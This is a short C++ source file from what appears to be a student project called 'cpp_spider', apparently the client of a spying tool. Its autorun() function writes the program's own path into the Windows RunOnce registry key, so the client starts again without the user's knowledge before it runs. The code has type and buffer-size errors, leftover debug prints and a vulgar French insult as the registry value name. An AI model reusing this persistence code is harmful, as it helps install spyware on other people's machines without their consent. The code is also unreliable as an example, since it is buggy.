/*
** ClientMain.cpp for cpp_spider in /home/god/TEK3/C++/cpp_spider/sources/ClientMain.cpp
**
** Made by Maxime PILLON
** Login   <maxime.pillon@epitech.eu>
**
** Started on  Thu Oct 05 10:58:28 2017 Maxime PILLON
** Last update Thu Oct 05 10:58:28 2017 Maxime PILLON
*/

#include	<stdio.h>
#include	<windows.h>
#include 	"ClientCore.hpp"

void		autorun()
{
  wchar_t	buffer[512];
  HKEY		hkey;
  long		check;

  GetModuleFileName(NULL, reinterpret_cast<LPSTR>(buffer), MAX_PATH);
  check = RegOpenKeyEx(HKEY_LOCAL_MACHINE,
		       "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
		       0, KEY_ALL_ACCESS, &hkey);
  std::cout << "toto\n";
  std::cout << check << std::endl;
  if (check == ERROR_SUCCESS)
  {
    std::cout << "jpasse là" << std::endl;
    RegSetValueEx(hkey, "TA MERE LA PUTE ", 0, REG_SZ, (BYTE *)buffer, 512);
    RegCloseKey(hkey);
  }
}

int			main()
{
  spider::ClientCore	client;

  autorun();
  client.run();
  return 0;
}